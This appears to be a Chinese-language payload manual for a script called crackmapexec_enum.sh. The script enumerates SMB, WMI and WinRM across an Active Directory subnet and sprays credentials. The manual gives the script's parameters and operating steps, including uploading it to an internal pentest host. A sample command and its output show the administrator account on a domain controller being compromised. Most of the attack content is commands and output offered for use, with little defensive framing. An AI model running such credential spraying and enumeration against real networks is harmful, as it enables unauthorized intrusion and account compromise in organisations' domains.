## 📦 载荷使用说明：crackmapexec_enum.sh

### 📝 功能说明
用于在活动目录环境中进行大规模的 SMB/WMI/WinRM 协议枚举和凭据喷洒。此脚本配置为通过 SMB 协议扫描指定网段，识别存活主机、系统版本并尝试验证提供的凭据。

### ⚙️ 参数说明
```text
- `target_ip`：目标 IP 或 CIDR 网段（如 `192.168.1.0/24`）
- `-u`：测试的用户名
- `-p`：测试的密码或 NTLM Hash
- `--shares`：枚举共享目录
- `--sessions`：枚举活动会话
```

### 🚀 操作步骤
1. 将脚本上传至内网渗透测试机。
2. 根据需要修改目标网段、用户名和密码参数。
3. 执行脚本：`bash crackmapexec_enum.sh`。
4. 查看输出结果，识别可访问的共享和验证成功的凭据。

### 💻 执行样例
```bash
# 扫描 192.168.1.0/24 网段，使用 administrator 凭据验证
./crackmapexec_enum.sh 192.168.1.0/24 -u administrator -p Admin@123

# 预期输出：
# SMB         192.168.1.10    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:contoso.com) (signing:True) (SMBv1:False)
# SMB         192.168.1.10    445    DC01             [+] contoso.com\administrator:Admin@123 (Pwn3d!)
```
